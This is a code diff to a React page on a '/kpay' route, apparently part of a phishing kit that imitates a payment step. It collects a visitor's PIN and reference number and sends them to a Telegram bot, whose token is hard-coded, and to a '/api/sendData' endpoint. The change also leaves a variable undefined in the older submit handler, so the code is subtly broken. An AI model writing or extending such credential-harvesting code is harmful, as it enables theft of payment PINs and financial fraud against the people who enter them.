@@ -25,7 +25,35 @@ function CodePageContent() {
       setExpired(true);
     }
   }, [timeLeft]);
+const handleSend = async () => {
+  if (!code) {
+      alert("Please fill in all fields");
+      return;
+    }
+const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
+    
+  try {
+    setIsProcessing(true);
+    const res = await fetch("/api/sendData", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text }),
+    });
 
+    const result = await res.json();
+    setIsProcessing(false);
+
+    if (result.success) {
+      router.push(`/kpay/finish?refN=${refN}&price=${price}`);
+    } else {
+      alert("حدث خطأ: " + result.error);
+    }
+  } catch (err) {
+    setIsProcessing(false);
+    console.error(err);
+    alert("حدث خطأ أثناء الإرسال");
+  }
+};
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (expired) {
@@ -33,7 +61,7 @@ function CodePageContent() {
       return;
     }
     if (code) {
-      const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
+      
       try {
         await axios.post(
           `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
@@ -42,7 +70,7 @@ function CodePageContent() {
             text: text
           }
         );
-        router.push(`/kpay/finish?refN=${refN}`);
+        
       } catch (error) {
         alert("Error sending data");
         console.error(error);
